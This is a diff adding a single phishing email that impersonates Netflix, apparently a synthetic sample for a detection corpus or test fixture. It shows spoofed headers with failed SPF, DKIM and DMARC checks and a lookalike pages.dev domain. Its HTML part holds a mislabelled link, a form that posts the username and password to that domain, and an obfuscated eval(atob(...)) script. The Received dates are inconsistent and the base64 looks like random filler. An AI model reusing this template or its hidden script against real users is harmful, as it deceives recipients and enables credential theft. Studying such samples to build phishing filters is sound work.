@@ -1,0 +1,31 @@
+From: notice@netflix-account.pages.dev
+To: victim23@example.com
+Subject: Access notice from Netflix [ref FFCF9DF]
+Date: Tue, 27 Mar 2002 22:09:00 -0500
+Message-ID: <phish-143-b8e00f25-6743-4cf1-bcc9-bebcf5b26fc4@netflix-account.pages.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 25 Mar 2002 14:19:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 03 Mar 2002 07:56:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 10 Mar 2002 22:56:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 11 Mar 2002 05:34:00 -0500
+Return-Path: <bounce@mail-1608f6ef.top>
+Reply-To: recovery3@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-1608f6ef.top; dkim=fail header.d=netflix-account.pages.dev; dmarc=fail header.from=netflix-account.pages.dev
+Received-SPF: fail (mx.example.com: domain of notice@netflix-account.pages.dev does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=netflix-account.pages.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-143-627c2a48"
+
+--bnd-p-143-627c2a48
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.netflix-account.pages.dev/auth?t=FFCF9DF
+
+Reference: FFCF9DF
+--bnd-p-143-627c2a48
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.netflix-account.pages.dev/auth?t=FFCF9DF<br/><br/>Reference: FFCF9DF</p><p><a href="http://netflix-account.pages.dev/login">https://www.netflix.com/signin</a></p><form action="http://netflix-account.pages.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-143-627c2a48--
